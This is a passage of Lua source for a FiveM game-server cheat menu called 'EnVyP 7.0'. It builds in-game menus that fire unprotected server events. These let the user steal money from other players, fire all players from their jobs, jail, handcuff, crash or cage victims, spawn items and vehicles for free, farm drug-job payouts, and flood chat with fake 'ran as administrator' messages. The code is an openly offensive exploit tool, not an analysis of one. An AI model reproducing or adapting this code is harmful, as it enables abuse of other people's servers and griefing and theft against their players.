...
local A = 0.005
local B = 0.005
local C = 'EnVyP Community'
local function D(E)
    if EnVyP7.debug then
        Citizen.Trace('[EnVyP7] ' .. tostring(E))
    end
end
...
function EnVyP7.CreateMenu(G, a4)
    j[G] = {}
    j[G].title = a4
    j[G].subTitle = C
    j[G].visible = false
...
function EnVyP7.CreateSubMenu(G, a6, a7)
    if j[a6] then
        EnVyP7.CreateMenu(G, j[a6].title)
        if a7 then
            F(G, 'subTitle', a7)
        else
...
function EnVyP7.CurrentMenu()
    return n
end

function EnVyP7.OpenMenu(G)
    if G and j[G] then
...
function EnVyP7.IsMenuOpened(G)
    return I(G)
end

function EnVyP7.IsAnyMenuOpened()
...
function EnVyP7.IsMenuAboutToBeClosed()
    if j[n] then
...
function EnVyP7.MenuButton(E, G)
    if j[G] then
        if EnVyP7.Button(E) then
            J(n, false)
            J(G, true, true)
            return true
        end
...
function EnVyP7.CheckBox(E, bool, aa)
    local ab = '~r~~h~OFF'
    if bool then
        ab = '~g~~h~ON'
    end
    if EnVyP7.Button(E, ab) then
        bool = not bool
...
function EnVyP7.ComboBox(E, ac, ad, ae, aa)
    local af = #ac
    local ag = ac[ad]
...
function EnVyP7.SetMenuWidth(G, U)
    F(G, 'width', U)
end

function EnVyP7.SetMenuX(G, x)
    F(G, 'x', x)
end

function EnVyP7.SetMenuY(G, y)
    F(G, 'y', y)
end

function EnVyP7.SetMenuMaxOptionCountOnScreen(G, count)
    F(G, 'maxOptionCount', count)
end

function EnVyP7.SetTitleColor(G, r, g, b, a)
    F(G, 'titleColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or j[G].titleColor.a})
end

function EnVyP7.SetTitleBackgroundColor(G, r, g, b, a)
    F(
        G,
...
function EnVyP7.SetTitleBackgroundSprite(G, ah, ai)
    F(G, 'titleBackgroundSprite', {dict = ah, name = ai})
end

function EnVyP7.SetSubTitle(G, E)
    F(G, 'subTitle', E)
end

function EnVyP7.SetMenuBackgroundColor(G, r, g, b, a)
    F(
        G,
        'menuBackgroundColor',
        {
...
function EnVyP7.SetMenuTextColor(G, r, g, b, a)
    F(G, 'menuTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or j[G].menuTextColor.a})
end

function EnVyP7.SetMenuSubTextColor(G, r, g, b, a)
    F(G, 'menuSubTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or j[G].menuSubTextColor.a})
end

function EnVyP7.SetMenuFocusColor(G, r, g, b, a)
    F(G, 'menuFocusColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or j[G].menuFocusColor.a})
end

function EnVyP7.SetMenuButtonPressedSound(G, name, aj)
...
function hmeth()
    ...
    TriggerServerEvent('methlab:done')
    TriggerServerEvent('methlab:done')
    TriggerServerEvent('methlab:done')
    TriggerServerEvent('methlab:done')
    TriggerServerEvent('methlab:done')
...
local function cc()
    if cb == 3 then
        drawNotification("<FONT COLOR='#ff22f4'>~h~Login failed, EnVyP Disabled!.")
        Citizen.Wait(5000)
        ...
        while bm do
            ...
            if chatspam then
                TriggerServerEvent(
                    ...
                    'EnVyP-FiveM-Fuuck',
                    {0, 0x99, 255},
                    '/ooc cityliver.EXE RAN AS ADMINISTRATOR'
                )
                TriggerServerEvent('_chat:messageEntered', 'EnVyP-FiveM', {0, 0x99, 255}, 'cityliver.EXE RAN AS ADMINISTRATOR')
            end
            if MagicBullet then
            ...
            if BananaBoom then
                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) then
                        ...
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'EnVyP-FiveM-BANANAPARTY',
                            {0, 0x99, 255},
                            '/ooc Yo cityliver.EXE RAN AS ADMINISTRATOR'
                        )
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'EnVyP-FiveM-BANANAPARTY',
                            {0, 0x99, 255},
                            'Yo cityliver.EXE RAN AS ADMINISTRATOR'
                        )
                    end
                end
                ...
                for i = 0, 256 do
                    if NetworkIsPlayerActive(i) then
                        ...
                        TriggerServerEvent(
                            ...
                            'EnVyP-FiveM-BANANAPARTY',
                            {0, 0x99, 255},
                            '/tweet Yo cityliver.EXE RAN AS ADMINISTRATOR'
                        )
                    end
                end
            end
...
Citizen.CreateThread(
    function()
        ...
        local d10 = {1.0, 2.0, 3.0, 4.0, 5}
        local d11 = 1
        local d12 = 1
        EnVyP7.CreateMenu('EnVyPx', 'EnVyP 7.0')
        EnVyP7.SetSubTitle('EnVyPx', 'EnVyP Community')
        EnVyP7.CreateSubMenu('SelfMenu', 'EnVyPx', 'Self Menu')
        EnVyP7.CreateSubMenu(
            'TeleportMenu',
            'EnVyPx',
            'Teleport Menu'
        )
        ...
        EnVyP7.CreateSubMenu('LuaMenu', 'EnVyPx', 'Lua Menu')
        EnVyP7.CreateSubMenu(
            'VehicleMenu',
            'EnVyPx',
            'Vehicle Menu'
        )
        EnVyP7.CreateSubMenu("AICONTROLMENU", "VehicleMenu", "AI Menu")
        EnVyP7.CreateSubMenu(
            'OnlinePlayerMenu',
            'EnVyPx',
            'Online Player Menu'
        ...
        EnVyP7.CreateSubMenu('Credits', 'EnVyPx', 'Credits')
        EnVyP7.CreateSubMenu('ESXJobs', 'LuaMenu', 'ESX Jobs')
        EnVyP7.CreateSubMenu(
            'ESXJobs2',
            'PlayerOptionsMenu',
            'ESX Jobs Individual'
        ...
        EnVyP7.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
        EnVyP7.CreateSubMenu('CarTypes', 'VehicleMenu', 'Vehicles')
        EnVyP7.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Moew :3')
        EnVyP7.CreateSubMenu(
            'CarOptions',
            'CarTypeSelection',
            'Car Options'
        ...
        EnVyP7.CreateSubMenu('LSC', 'VehicleMenu', 'LSC Customs')
        EnVyP7.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
        EnVyP7.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
        EnVyP7.CreateSubMenu(
            'VRPPlayerTriggers',
            'PlayerOptionsMenu',
            'VRP Triggers'
        ...
        for i, da in pairs(be) do
            EnVyP7.CreateSubMenu(da.id, 'tunings', da.name)
            if da.id == 'paint' then
                EnVyP7.CreateSubMenu('primary', da.id, 'Primary Paint')
                EnVyP7.CreateSubMenu('secondary', da.id, 'Secondary Paint')
                EnVyP7.CreateSubMenu('rimpaint', da.id, 'Wheel Paint')
                EnVyP7.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                EnVyP7.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                EnVyP7.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                EnVyP7.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                EnVyP7.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                EnVyP7.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                EnVyP7.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                EnVyP7.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                EnVyP7.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                EnVyP7.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                EnVyP7.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                EnVyP7.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
        for i, da in pairs(bf) do
            EnVyP7.CreateSubMenu(da.id, 'performance', da.name)
        end
        ...
        while bm do
            ...
            for i, da in pairs(be) do
                if EnVyP7.IsMenuOpened('tunings') then
                    if b9 then
                        if bb == 'neon' then
                ...
                if EnVyP7.IsMenuOpened(da.id) then
                    if da.id == 'wheeltypes' then
                        if EnVyP7.Button('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif EnVyP7.Button('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif EnVyP7.Button('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif EnVyP7.Button('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif EnVyP7.Button('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif EnVyP7.Button('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif EnVyP7.Button('High End Wheels') then
                    ...
                    elseif da.id == 'neon' then
                        ...
                        for i, da in pairs(bg) do
                            ...
                            if EnVyP7.Button(i, pricestring) then
                                if not b9 then
                                    bb = 'neon'
                    ...
                    elseif da.id == 'paint' then
                        if EnVyP7.MenuButton('~h~~p~-> ~s~Primary Paint', 'primary') then
                        elseif EnVyP7.MenuButton('~h~~p~-> ~s~Secondary Paint', 'secondary') then
                        elseif EnVyP7.MenuButton('~h~~p~-> ~s~Wheel Paint', 'rimpaint') then
                        end
                        EnVyP7.Display()
                    else
                        ...
                        for dg, dh in pairs(at) do
                            ...
                            if EnVyP7.Button(dh.menuName, price) then
                                if not b9 then
                                    bb = da.id
            ...
            for i, da in pairs(bf) do
                if EnVyP7.IsMenuOpened(da.id) then
                    ...
                    if EnVyP7.Button('Stock ' .. da.name, pricestock) then
                        SetVehicleMod(veh, da.id, -1)
                    elseif EnVyP7.Button(da.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, da.id, 0)
                    elseif EnVyP7.Button(da.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, da.id, 1)
                    elseif EnVyP7.Button(da.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, da.id, 2)
                    elseif da.id ~= 13 and da.id ~= 12 and EnVyP7.Button(da.name .. ' Upgrade 4', price4) then
                        SetVehicleMod(veh, da.id, 3)
                    end
                    EnVyP7.Display()
                end
            end
            if EnVyP7.IsMenuOpened('EnVyPx') then
                local dk = PlayerId(-1)
                local bv = GetPlayerName(dk)
                drawNotification("~h~EnVyP <FONT COLOR='#ff22f4'>7 ~s~∑~p~ -> ~s~"..bv)
                drawNotification("<FONT COLOR='#22ff40'>EnVyP Menu Version 7.0")
                if
                    EnVyP7.MenuButton(
                        '~h~~s~Self Menu~p~                                                ~p~»',
                        'SelfMenu'
                ...
                elseif
                 ...
                 then
                elseif EnVyP7.Button('~r~~h~End Menu') then
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('SelfMenu') then
                if
                    EnVyP7.CheckBox(
                        '~h~~g~Godmode',
                        Godmode,
                ...
                elseif 
                 ...
                 then
                elseif EnVyP7.Button('~h~~y~Bulletproof') then
                ...
                elseif
                 ...
                 then
                elseif EnVyP7.Button('~h~~r~Suicide') then
                ...
                elseif EnVyP7.Button('~h~~g~Heal/Revive') then
                    SetEntityHealth(PlayerPedId(-1), 200)
                elseif EnVyP7.Button('~h~~b~Give Armour') then
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('OnlinePlayerMenu') then
                for i = 0, 128 do
                    if
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('PlayerOptionsMenu') then
                EnVyP7.SetSubTitle(
                    'PlayerOptionsMenu',
                ...
                elseif
                 ...
                 then
                elseif EnVyP7.Button('~h~~g~Heal ~s~Player') then
                ...
                elseif EnVyP7.Button('~h~Spectate', c3 and '~g~[SPECTATING]') then
                    SpectatePlayer(SelectedPlayer)
		elseif EnVyP7.Button('~h~~r~Semi GOD ~s~Player') then
                    local dS = 'stt_prop_stunt_soccer_ball'
                    while not HasModelLoaded(GetHashKey(dS)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dS))
                ...
                elseif EnVyP7.Button('~h~Teleport To') then
                    local cP = KeyboardInput('Are you sure? y/n', '', 0)
                    if cP == 'y' then
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                ...
                elseif
                 ...
                 then
                elseif
                    EnVyP7.Button('~h~Give ~r~All Weapons')
                 then
                    for i = 1, #a_ do
                ...
                elseif
                    EnVyP7.Button(
                        '~h~Remove ~r~All Weapons'
                    )
                 then
                    RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
                elseif EnVyP7.Button('~h~Give ~r~Vehicle') then
                    local ped = GetPlayerPed(SelectedPlayer)
                    local bT =
                        KeyboardInput(
                        'Enter Vehicle Spawn Name',
                        '',
                        100
                    )
                    if bT and IsModelValid(bT) and IsModelAVehicle(bT) then
                        ...
                        drawNotification(
                            '~r~Model is not valid!'
                        )
                    end
				elseif EnVyP7.Button("~h~Give ~r~Owned ~b~Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
                ...
                elseif EnVyP7.Button('~h~Send To ~r~Jail') then
                    TriggerServerEvent(
                        'esx-qalle-jail:jailPlayer',
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('ESXTriggerini') then
                if EnVyP7.Button('~h~~g~Revive Player') then
                    TriggerEvent(
                        'esx_ambulancejob:revive',
                        GetPlayerServerId(SelectedPlayer)
                    )
                    ...
                    TriggerServerEvent('surgeon:revive', GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent('surgeon:revive', SelectedPlayer)
                    TriggerServerEvent('extraitems:revive', GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent('extraitems:revive', SelectedPlayer)
                    TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent("whoapd:revive", SelectedPlayer)
                    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent("paramedic:revive", SelectedPlayer)
                    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent("ems:revive", SelectedPlayer)
                elseif
                    EnVyP7.Button(
                        '~h~~g~Give money to player from your wallet'
                    )
                 then
                    local f =
                        KeyboardInput(
                ...
                elseif
                    EnVyP7.Button(
                        '~h~~r~Steal money from a player'
                    )
                 then
                    local f =
                        KeyboardInput(
                        'Enter amount of money to steal',
                        '',
                        100
                    )
                    if f ~= '' then
                ...
                elseif EnVyP7.Button('~h~~b~Handcuff Player') then
                    TriggerEvent(
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('VRPPlayerTriggers') then
                if
                    EnVyP7.Button(
                        '~h~Transfer money from your bank'
                    )
                 then
                    local dn =
                        KeyboardInput(
                    ...
                    local dp = KeyboardInput('Enter VRP PERMA ID!', '', 100)
                    if dn ~= '' then
                        local cQ = GetPlayerServerId(PlayerId())
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('ESXJobs2') then
                if EnVyP7.Button('~h~Set Unemployed') then
                    TriggerServerEvent(
                        'NB:destituerplayer',
                        GetPlayerServerId(SelectedPlayer)
                    )
                ...
                elseif
                    EnVyP7.Button('~h~Set ~b~Police ~s~Job')
                 then
                    TriggerServerEvent(
                        'NB:recruterplayer',
                        GetPlayerServerId(SelectedPlayer),
                ...
                elseif
                    EnVyP7.Button('~h~Set ~o~Mechanic ~s~Job')
                 then
                    TriggerServerEvent(
                        'NB:recruterplayer',
                        GetPlayerServerId(SelectedPlayer),
                ...
                elseif EnVyP7.Button('~h~Set ~y~Taxi ~s~Job') then
                    TriggerServerEvent(
                        'NB:recruterplayer',
                        GetPlayerServerId(SelectedPlayer),
                        'taxi',
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('Trollmenu') then
                if
                    EnVyP7.Button(
                        '~h~~r~Fake ~s~Chat Message'
                    )
                 then
                ...
                elseif
                    EnVyP7.Button(
                        '~h~~r~Kick ~s~From Vehicle'
                    )
                 then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif EnVyP7.Button('~h~~r~Cage ~s~Player') then
                ...
                elseif EnVyP7.Button('~h~~r~Hamburgher ~s~Player') then
                ...
                elseif EnVyP7.Button('~h~~r~Hamburgher ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif EnVyP7.Button('~h~~r~Snowball troll ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                ...
                elseif EnVyP7.Button('~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_') then
                ...
                elseif EnVyP7.Button('~h~Clone Car') then
                    ClonePedVeh()
                elseif EnVyP7.Button('~h~Spawn Driveby') then
                ...
                elseif EnVyP7.Button('~h~~r~Attempt Crash') then
                ...
                elseif EnVyP7.Button('~h~Spawn Following Asshat') then
                    asshat = true
                ...
                elseif EnVyP7.Button('~h~Follow Player') then
                ...
                elseif EnVyP7.Button('~h~Spawn Swat ~r~AK') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey('s_m_y_swat_01'))
                        Citizen.Wait(50)
                ...
                elseif EnVyP7.Button('~h~Spawn Wade ~r~RPG') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey('ig_wade'))
                        Citizen.Wait(50)
                ...
                elseif EnVyP7.Button('~h~~r~Banana ~p~Party') then
                    bananaparty()
                elseif EnVyP7.Button('~h~~r~Explode') then
                ...
                elseif EnVyP7.Button('~h~~r~hugparty') then
                    hugpartyplayer()
                end
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('TeleportMenu') then
                if
                    EnVyP7.Button(
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('WeaponMenu') then
                if EnVyP7.MenuButton('~h~~p~-> ~s~Give Single Weapon', 'WeaponTypes') then
                elseif
                    EnVyP7.CheckBox(
                        '~h~Magic Bullet',
                        MagicBullet,
                 ...
                 then
                elseif
                    EnVyP7.Button('~h~~g~Give All Weapons')
                 then
                    for i = 1, #a_ do
                ...
                elseif EnVyP7.Button('~h~Drop your current Weapon') then
                ...
                elseif EnVyP7.Button('~h~Give Ammo') then
                    for i = 1, #a_ do
                ...
                elseif 
                        ...
                        function(ad, ae)
                            d11 = ad;
                            d12 = ae;
                            SetPlayerWeaponDamageModifier(PlayerId(), d12)
                            SetPlayerMeleeWeaponDamageModifier(PlayerId(), d12)
                        end
                    )
                 then
                elseif
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(be) do
                    if da.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if EnVyP7.MenuButton(da.name, da.id) then
                        end
                    elseif da.id == 'neon' then
                        if EnVyP7.MenuButton(da.name, da.id) then
                        end
                ...
                if EnVyP7.Button('Xenon Headlight', xenonStatus) then
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(bf) do
                    if EnVyP7.MenuButton(da.name, da.id) then
                    end
                ...
                if EnVyP7.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
                    if not IsToggleModOn(veh, 18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    end
                end
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('primary') then
                EnVyP7.MenuButton('~h~~p~-> ~s~Classic', 'classic1')
                EnVyP7.MenuButton('~h~~p~-> ~s~Metallic', 'metallic1')
                EnVyP7.MenuButton('~h~~p~-> ~s~Matte', 'matte1')
                EnVyP7.MenuButton('~h~~p~-> ~s~Metal', 'metal1')
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('secondary') then
                EnVyP7.MenuButton('~h~~p~-> ~s~Classic', 'classic2')
                EnVyP7.MenuButton('~h~~p~-> ~s~Metallic', 'metallic2')
                EnVyP7.MenuButton('~h~~p~-> ~s~Matte', 'matte2')
                EnVyP7.MenuButton('~h~~p~-> ~s~Metal', 'metal2')
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('rimpaint') then
                EnVyP7.MenuButton('~h~~p~-> ~s~Classic', 'classic3')
                EnVyP7.MenuButton('~h~~p~-> ~s~Metallic', 'metallic3')
                EnVyP7.MenuButton('~h~~p~-> ~s~Matte', 'matte3')
                EnVyP7.MenuButton('~h~~p~-> ~s~Metal', 'metal3')
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('classic1') then
                for dt, du in pairs(bh) do
                    ...
                    if EnVyP7.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('metallic1') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('matte1') then
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('metal1') then
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('classic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('metallic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('matte2') then
                for dt, du in pairs(bj) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('metal2') then
                for dt, du in pairs(bk) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('classic3') then
                for dt, du in pairs(bh) do
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('metallic3') then
                for dt, du in pairs(bh) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('matte3') then
                for dt, du in pairs(bj) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('metal3') then
                for dt, du in pairs(bk) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('AICONTROLMENU') then
                if EnVyP7.Button('~h~Configure AI ~g~Speed') then
                ...
                elseif EnVyP7.Button('~h~AI Drive (~b~Waypoint ~o~Slow~s~)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                ...
                elseif EnVyP7.Button('~h~AI Drive (~b~Waypoint ~g~Fast~s~)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('VehicleMenu') then
                if EnVyP7.MenuButton('~h~~p~-> ~s~~h~~b~LSC ~s~Customs', 'LSC') then
                elseif EnVyP7.MenuButton('~h~~p~->~s~ Vehicle ~g~Boost', 'BoostMenu') then
                elseif EnVyP7.MenuButton('~h~~p~->~s~ Vehicle List', 'CarTypes') then
                elseif EnVyP7.MenuButton("~h~~p~->~s~ AI Menu", "AICONTROLMENU") then
                elseif
                    EnVyP7.Button(
                ...
                elseif
                 ...
                 then
                    bU()
                elseif EnVyP7.Button('~h~~g~Repair ~s~Engine') then
                    cd()
                elseif EnVyP7.Button('~h~Flip Vehicle') then
                    daojosdinpatpemata()
                elseif EnVyP7.Button('~h~~b~Max ~s~Tuning') then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif
                    EnVyP7.CheckBox(
                        '~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w Vehicle Colour',
                        RainbowVeh,
                        function(dl)
                            RainbowVeh = dl
                        end
                ...
                elseif EnVyP7.Button('~h~Make vehicle dirty') then
                    Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif EnVyP7.Button('~h~Make vehicle clean') then
                ...
                elseif
                 ...
                 then
                    bW()
                elseif EnVyP7.Button('~h~Refuel Vehicle') then
                    bV()
                elseif
                    EnVyP7.CheckBox(
                        '~h~No Fall',
                ...
                EnVyP7.CheckBox(
                    ...
                    function(dl)
                        supergrip = dl
                        SetPedCanBeKnockedOffVehicle(PlayerPedId(-1), supergrip)
                    end
                )
                 then
                elseif
...
EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('LuaMenu') then
                if EnVyP7.MenuButton('~h~~p~-> ~s~~r~ESX ~s~Boss', 'ESXBoss') then
                elseif EnVyP7.MenuButton('~h~~p~-> ~s~~r~ESX ~s~Money', 'ESXMoney') then
                elseif EnVyP7.MenuButton('~h~~p~-> ~s~~r~ESX ~s~Jobs', 'ESXJobs') then
                elseif EnVyP7.MenuButton('~h~~p~-> ~s~~r~ESX ~s~Misc', 'ESXCustom') then
                elseif EnVyP7.MenuButton('~h~~p~-> ~s~~r~ESX ~s~Items', 'ESXItems') then
                elseif EnVyP7.MenuButton('~h~~p~-> ~s~~y~VRP ~s~Triggers', 'VRPTriggers') then
                elseif
                    EnVyP7.MenuButton('~h~~p~-> ~s~~b~Misc ~s~Triggers', 'MiscTriggers')
                 then
                end
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('ESXJobs') then
                if EnVyP7.Button('~h~Fire all players') then
                    for a = 0, 128 do
                        TriggerServerEvent(
                            'NB:destituerplayer',
                            GetPlayerServerId(a)
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('ESXBoss') then
                if
                    EnVyP7.Button(
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('ESXMoney') then
                if EnVyP7.Button("~h~<FONT COLOR='#ff22f4'>Automatic Money ~r~ WARNING!") then
                    automaticmoneyesx()
                elseif EnVyP7.Button('~g~~h~ESX ~y~Nightline Bus Pay') then
                ...
                elseif
                    EnVyP7.Button('~g~~h~ESX ~y~Postal Job')
                 then
                    local f =
                        KeyboardInput(
                        'Enter amount of money',
                ...
                elseif
                    EnVyP7.Button('~g~~h~ESX ~y~Banker Job')
                 then
                    local f =
                        KeyboardInput(
                        'Enter amount of money',
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('ESXCustom') then
                if EnVyP7.Button('~w~~h~Set hunger to ~h~~g~100%') then
                    TriggerEvent('esx_status:set', 'hunger', 1000000)
                elseif EnVyP7.Button('~w~~h~Set thirst to ~h~~g~100%') then
                    TriggerEvent('esx_status:set', 'thirst', 1000000)
                elseif EnVyP7.Button('~g~~h~ESX ~r~Revive') then
                    local G =
                        KeyboardInput(
                ...
                elseif EnVyP7.Button('~g~~h~ESX ~b~Handcuff') then
                    local G =
                        KeyboardInput(
                        'Enter Player ID or all',
                        '',
                ...
                elseif
                    EnVyP7.Button('~h~Get All Driving License')
                 then
                    TriggerServerEvent(
                    ...
                    TriggerServerEvent(
                        ...
                        drive_truck)
                elseif
                    EnVyP7.Button('~h~~g~ESX ~s~Retreive Car')
                 then
                    local eF = KeyboardInput("Enter license plate","",100)
                    TriggerServerEvent('insurance:insurance', eF) 
                    drawNotification("Done!") 
                elseif
                    EnVyP7.Button(
                        '~h~Get Owned vehicle for ~g~free'
                    )
                 then
                    bX()
                end
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('ESXItems') then
                if EnVyP7.Button("~h~~o~Harvest Jewelry ~c~(x5)") then
                    jewelry()
                elseif EnVyP7.Button('~h~~g~Sell ~r~Drugs ~c~(x5)') then
                    sdrugs()
                elseif EnVyP7.Button('~h~~g~Harvest ~g~Weed ~c~(x5)') then
                    hweed()
                elseif EnVyP7.Button('~h~~g~Transform ~g~Weed ~c~(x5)') then
                    tweed()
                elseif EnVyP7.Button('~h~~g~Sell ~g~Weed ~c~(x5)') then
                    sweed()
                elseif EnVyP7.Button('~h~~w~Harvest ~w~Coke ~c~(x5)') then
                    hcoke()
                elseif EnVyP7.Button('~h~~w~Transform ~w~Coke ~c~(x5)') then
                    tcoke()
                elseif EnVyP7.Button('~h~~w~Sell ~w~Coke ~c~(x5)') then
                    scoke()
                elseif EnVyP7.Button('~h~~r~Harvest Meth ~c~(x5)') then
                    hmeth()
                elseif EnVyP7.Button('~h~~r~Transform Meth ~c~(x5)') then
                    tmeth()
                elseif EnVyP7.Button('~h~~r~Sell Meth ~c~(x5)') then
                    smeth()
                elseif EnVyP7.Button('~h~~p~Harvest Opium ~c~(x5)') then
                    hopi()
                elseif EnVyP7.Button('~h~~p~Transform Opium ~c~(x5)') then
                    topi()
                elseif EnVyP7.Button('~h~~p~Sell Opium ~c~(x5)') then
                    sopi()
                elseif EnVyP7.Button('~h~~g~Money Wash ~c~(x10)') then
                    mataaspalarufe()
                elseif EnVyP7.Button('~r~~h~Stop all ~c~(Drugs)') then
                    matanumaispalarufe()
                elseif
                    EnVyP7.CheckBox(
                 ...
                 then
                elseif EnVyP7.Button("~h~Spawn items from ~y~mech ~g~v1") then 
                ...
                elseif EnVyP7.Button("~h~Spawn items from ~y~mech ~g~v2") then 
                    local itemName = KeyboardInput("Enter item name", "", 100) 
                    if itemName then local itemAmount =  KeyboardInput("Enter amount", "", 100) 
                        if itemAmount then 
                            TriggerServerEvent('esx_vehicleshop:putStockItems', itemName2,-(itemAmount2)) 
                        end 
                    end 
